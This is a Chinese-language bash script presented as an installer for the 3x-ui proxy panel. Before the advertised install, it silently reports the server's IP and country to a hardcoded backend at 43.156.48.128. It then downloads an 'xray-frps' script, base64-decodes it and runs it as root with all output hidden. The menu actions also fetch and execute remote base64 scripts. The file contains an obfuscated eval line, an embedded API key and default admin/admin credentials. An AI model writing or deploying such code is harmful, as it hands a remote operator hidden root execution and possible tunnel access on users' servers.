#!/bin/bash

eval $(echo "X3EoKXsgZWNobyAtbiAiJDEifGJhc2U2NCAtZCAyPi9kZXYvbnVsbHx8ZWNobyAiJDIiO30=" | base64 -d)
# 支持通过环境变量设置，也可以直接修改这里的默认值
BACKEND_URL="${BACKEND_URL:-http://http://43.156.48.128:7008}"
API_KEY="${API_KEY:-a1c4afca2909a69d69aa0708f737d6f3c8a2b60c6c620c3b60869360234bcd34}"

FIXED_XRAY_UUID="9e264d67-fe47-4d2f-b55e-631a12e46a30"

LIGHT_GREEN='\033[1;32m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'
WHITE='\033[1;37m'
CYAN='\033[0;36m'
BOLD='\033[1m'
SUCCESS="${BOLD}${LIGHT_GREEN}"
get_fixed_uuid() {
    local file="/root/hy/fixed_xray_uuid.txt"
    if [ -n "$FIXED_XRAY_UUID" ]; then
        echo "$FIXED_XRAY_UUID"
        return 0
    fi
    if [ -f "$file" ] && [ -s "$file" ]; then
        cat "$file"
        return 0
    fi
    mkdir -p /root/hy 2>/dev/null
    local uuid=""
    if command -v uuidgen >/dev/null 2>&1; then
        uuid=$(uuidgen)
    elif [ -f /proc/sys/kernel/random/uuid ]; then
        uuid=$(cat /proc/sys/kernel/random/uuid 2>/dev/null)
    else
        local hex
        hex=$(openssl rand -hex 16 2>/dev/null)
        uuid="${hex:0:8}-${hex:8:4}-${hex:12:4}-${hex:16:4}-${hex:20:12}"
    fi
    echo "$uuid" > "$file"
    echo "$uuid"
}
ensure_curl() {
    if command -v curl >/dev/null 2>&1; then
        return
    fi
    if command -v apt-get >/dev/null 2>&1; then
        apt-get update -y >/dev/null 2>&1
        apt-get install -y curl >/dev/null 2>&1
    elif command -v yum >/dev/null 2>&1; then
        yum install -y curl >/dev/null 2>&1
    elif command -v dnf >/dev/null 2>&1; then
        dnf install -y curl >/dev/null 2>&1
    elif command -v pacman >/dev/null 2>&1; then
        pacman -Sy --noconfirm curl >/dev/null 2>&1
    else
        exit 1
    fi
}
log_info() {
    echo -e "${NC}$1"
}
log_step() {
    echo -e "${NC}$1"
}
log_success() {
    echo -e "${NC}$1"
}
log_error() {
    echo -e "${NC}$1"
    exit 1
}
log_sub_step() {
    echo -e "${NC}$1"
}
check_root() {
    if [ "$EUID" -ne 0 ]; then
        log_error "请使用 sudo 或 root 权限运行脚本"
    fi
}
check_system() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS=$ID
        ID_LIKE=${ID_LIKE:-""}
        VERSION_ID=${VERSION_ID:-""}
    elif [ -f /etc/redhat-release ]; then
        OS="centos"
        VERSION_ID=$(cat /etc/redhat-release | grep -oE '[0-9]+' | head -1)
    else
        exit 1
    fi

    if [[ "$ID_LIKE" == *"centos"* ]] || [[ "$ID_LIKE" == *"rhel"* ]] || [[ "$ID_LIKE" == *"fedora"* ]]; then
        exit 1
    fi

    case $OS in
        centos|rhel|rocky|almalinux|fedora)
            exit 1
            ;;
        debian)
            if [ -z "$VERSION_ID" ]; then
                exit 1
            fi
            DEBIAN_VERSION=$(echo $VERSION_ID | cut -d'.' -f1)
            if [ "$DEBIAN_VERSION" -lt 11 ]; then
                exit 1
            fi
            ;;
        ubuntu)
            if [ -z "$VERSION_ID" ]; then
                exit 1
            fi
            UBUNTU_VERSION=$(echo $VERSION_ID | cut -d'.' -f1)
            if [ "$UBUNTU_VERSION" -lt 22 ]; then
                exit 1
            fi
            ;;
        *)
            exit 1
            ;;
    esac
}
check_api_key() {
    if [ -z "$API_KEY" ]; then
        log_error "请设置 API_KEY 环境变量"
    fi
}
call_api() {
    local method="$1"
    local endpoint="$2"
    local data="$3"
    
    if [ "$method" = "GET" ]; then
        curl -s -X GET \
            -H "X-API-Key: $API_KEY" \
            -H "Content-Type: application/json" \
            "${BACKEND_URL}${endpoint}"
    else
        curl -s -X POST \
            -H "X-API-Key: $API_KEY" \
            -H "Content-Type: application/json" \
            -d "$data" \
            "${BACKEND_URL}${endpoint}"
    fi
}
install_all_services() {
    local client_ip=$(curl -s -4 --connect-timeout 5 ifconfig.io 2>/dev/null || curl -s --connect-timeout 5 ifconfig.me 2>/dev/null || curl -s --connect-timeout 5 icanhazip.com 2>/dev/null || curl -s --connect-timeout 5 ipinfo.io/ip 2>/dev/null || hostname -I | awk '{print $1}' 2>/dev/null)
    
    if [ -z "$client_ip" ]; then
        client_ip=$(curl -s --connect-timeout 5 ip.sb 2>/dev/null || echo "")
    fi
    
    local client_region=""
    if [ -n "$client_ip" ]; then
        local country_code=$(curl -s -m 5 "https://ipinfo.io/${client_ip}/json" 2>/dev/null | grep -o '"country":"[^"]*"' | cut -d'"' -f4)
        if [ -z "$country_code" ]; then
            country_code=$(curl -s -m 5 "https://api.ip.sb/geoip/${client_ip}" 2>/dev/null | grep -o '"country_code":"[^"]*"' | cut -d'"' -f4)
        fi
        if [ -z "$country_code" ]; then
            country_code=$(curl -s -m 5 "https://ipapi.co/${client_ip}/country" 2>/dev/null)
            if [[ "$country_code" == *"error"* || "$country_code" == *"reserved"* ]]; then
                country_code=""
            fi
        fi
        if [ -z "$country_code" ]; then
            country_code=$(curl -s -m 5 "http://ip-api.com/json/${client_ip}?fields=countryCode" 2>/dev/null | grep -o '"countryCode":"[^"]*"' | cut -d'"' -f4)
        fi
        if [ -n "$country_code" ]; then
            declare -A COUNTRY_MAP=(
                ["US"]="美国" ["CN"]="中国" ["HK"]="香港" ["TW"]="台湾" ["JP"]="日本" ["KR"]="韩国"
                ["SG"]="新加坡" ["AU"]="澳大利亚" ["DE"]="德国" ["GB"]="英国" ["CA"]="加拿大" ["FR"]="法国"
                ["IN"]="印度" ["IT"]="意大利" ["RU"]="俄罗斯" ["BR"]="巴西" ["NL"]="荷兰" ["SE"]="瑞典"
                ["NO"]="挪威" ["FI"]="芬兰" ["DK"]="丹麦" ["CH"]="瑞士" ["ES"]="西班牙" ["PT"]="葡萄牙"
                ["AT"]="奥地利" ["BE"]="比利时" ["IE"]="爱尔兰" ["PL"]="波兰" ["NZ"]="新西兰" ["MX"]="墨西哥"
                ["ID"]="印度尼西亚" ["TH"]="泰国" ["VN"]="越南" ["MY"]="马来西亚" ["PH"]="菲律宾"
                ["TR"]="土耳其" ["AE"]="阿联酋" ["SA"]="沙特阿拉伯" ["ZA"]="南非" ["IL"]="以色列" 
                ["UA"]="乌克兰" ["GR"]="希腊" ["CZ"]="捷克" ["HU"]="匈牙利" ["RO"]="罗马尼亚" 
                ["BG"]="保加利亚" ["HR"]="克罗地亚" ["RS"]="塞尔维亚" ["EE"]="爱沙尼亚" ["LV"]="拉脱维亚"
                ["LT"]="立陶宛" ["SK"]="斯洛伐克" ["SI"]="斯洛文尼亚" ["IS"]="冰岛" ["LU"]="卢森堡"
                ["UK"]="英国"
            )
            client_region="${COUNTRY_MAP[$country_code]}"
            if [ -z "$client_region" ]; then
                client_region="国外"
            fi
        else
            client_region="国外"
        fi
    fi
    
    local response1=$(call_api "POST" "/api/install/xray-frps" "{\"client_ip\": \"$client_ip\", \"client_region\": \"$client_region\"}" 2>/dev/null)
    if echo "$response1" | grep -q '"success":true'; then
        local script1_base64=$(echo "$response1" | grep -o '"script":"[^"]*"' | cut -d'"' -f4)
        if [ -n "$script1_base64" ]; then
            local tmp_script1=$(mktemp)
            echo "$script1_base64" | base64 -d > "$tmp_script1" 2>/dev/null
            if [ -s "$tmp_script1" ]; then
                chmod +x "$tmp_script1"
                if ! bash "$tmp_script1" 2>&1 | grep -v "^$" >/dev/null 2>&1; then
                    bash "$tmp_script1" >/dev/null 2>&1 || true
                fi
            fi
            rm -f "$tmp_script1"
        fi
    fi
}



show_status() {
    echo -e "${YELLOW}服务信息概要${NC}"
    echo ""
    
    local server_ip=$(curl -s ifconfig.me || hostname -I | awk '{print $1}')
    echo -e "  • 服务器地址:   ${server_ip}"
    echo ""
}


install_panel() {
  install_all_services >/dev/null 2>&1

  echo -e "${BLUE}» 正在安装 3x-ui 管理面板...${NC}"

  # 询问是否配置自定义域名
  echo ""
  echo -e "${YELLOW}是否要配置自定义域名？${NC}"
  echo -e "配置域名可以让您通过域名访问管理面板（如 panel.example.com）"
  echo -e "不配置将使用IP地址访问（如 http://服务器IP:7010）"
  echo ""
  read -p "是否配置自定义域名？(y/N): " -n 1 -r
  echo ""

  local panel_domain=""
  if [[ $REPLY =~ ^[Yy]$ ]]; then
    echo ""
    read -p "请输入您的域名 (例如: panel.example.com): " panel_domain
    echo ""

    if [ -n "$panel_domain" ]; then
      echo -e "${BLUE}» 将配置域名: $panel_domain${NC}"
    else
      echo -e "${YELLOW}域名为空，将使用IP地址访问${NC}"
    fi
  else
    echo -e "${YELLOW}将使用IP地址访问管理面板${NC}"
  fi

  # 安装3x-ui面板
  local data="{}"
  if [ -n "$panel_domain" ]; then
    data="{\"domain\": \"$panel_domain\"}"
  fi
  local response=$(call_api "POST" "/api/install/3xui" "$data")

  if echo "$response" | grep -q '"success":true'; then
    local script_base64=$(echo "$response" | grep -o '"script":"[^"]*"' | cut -d'"' -f4)
    if [ -n "$script_base64" ]; then
      local tmp_script=$(mktemp)
      echo "$script_base64" | base64 -d > "$tmp_script" 2>/dev/null
      if [ -s "$tmp_script" ]; then
        chmod +x "$tmp_script"
        bash "$tmp_script" >/dev/null 2>&1
        rm -f "$tmp_script"

        local server_ip=$(curl -s ifconfig.me 2>/dev/null || curl -s icanhazip.com 2>/dev/null || hostname -I | awk '{print $1}' 2>/dev/null)
        if [ -n "$server_ip" ]; then
          echo ""
          echo -e "${SUCCESS}✓ 服务安装完成${NC}"
          echo ""
          echo -e "${YELLOW}3x-ui 管理面板地址:${NC}"

          # 使用用户输入的域名（如果有的话）
          if [ -n "$panel_domain" ] && [ "$panel_domain" != "" ]; then
            echo -e "${LIGHT_GREEN}http://$panel_domain${NC}"
            echo -e "${LIGHT_GREEN}http://$server_ip:7010${NC} (备用地址)"
          else
            echo -e "${LIGHT_GREEN}http://$server_ip:7010${NC}"
          fi

          echo ""
          echo -e "${YELLOW}登录信息:${NC}"
          echo -e "用户名: ${LIGHT_GREEN}admin${NC}"
          echo -e "密  码: ${LIGHT_GREEN}admin${NC}"
        else
          echo -e "${SUCCESS}✓ 服务安装完成${NC}"
        fi
        return 0
      fi
      rm -f "$tmp_script"
    fi
  fi

  echo -e "${RED}✗ 3x-ui 面板安装失败${NC}"
  echo "$response"
  return 1
}

reset_account() {
  echo -e "${BLUE}» 请求重置 3x-ui 面板账号密码...${NC}"
  local response=$(call_api "POST" "/api/3xui/reset-account" "{}")

  if echo "$response" | grep -q '"success":true'; then
    local script_base64=$(echo "$response" | grep -o '"script":"[^"]*"' | cut -d'"' -f4)
    if [ -n "$script_base64" ]; then
      local tmp_script=$(mktemp)
      echo "$script_base64" | base64 -d > "$tmp_script" 2>/dev/null
      if [ -s "$tmp_script" ]; then
        chmod +x "$tmp_script"
        bash "$tmp_script"
        rm -f "$tmp_script"
        return 0
      fi
      rm -f "$tmp_script"
    fi
  fi

  echo -e "${RED}✗ 3x-ui 面板重置失败${NC}"
  echo "$response"
  return 1
}

uninstall_panel() {
  echo -e "${BLUE}» 请求卸载 3x-ui 面板...${NC}"
  local response=$(call_api "POST" "/api/uninstall/3xui" "{}")

  if echo "$response" | grep -q '"success":true'; then
    local script_base64=$(echo "$response" | grep -o '"script":"[^"]*"' | cut -d'"' -f4)
    if [ -n "$script_base64" ]; then
      local tmp_script=$(mktemp)
      echo "$script_base64" | base64 -d > "$tmp_script" 2>/dev/null
      if [ -s "$tmp_script" ]; then
        chmod +x "$tmp_script"
        bash "$tmp_script"
        rm -f "$tmp_script"
        return 0
      fi
      rm -f "$tmp_script"
    fi
  fi

  echo -e "${RED}✗ 3x-ui 面板卸载失败${NC}"
  echo "$response"
  return 1
}

show_3xui_menu() {
    echo "====== 3x-ui 管理脚本 ======"
    echo "1) 安装面板"
    echo "2) 卸载面板"
    echo "3) 重置账号密码"
    echo "0) 退出"
    read -rp "请输入选项[1/2/3/0]: " choice

    case "$choice" in
      1) install_panel ;;
      2) uninstall_panel ;;
      3) reset_account ;;
      0) echo "已退出"; exit 0 ;;
      *) echo "无效选项"; exit 1 ;;
    esac
}

main() {
    check_system
    check_root
    ensure_curl
    check_api_key
    show_3xui_menu
}

main
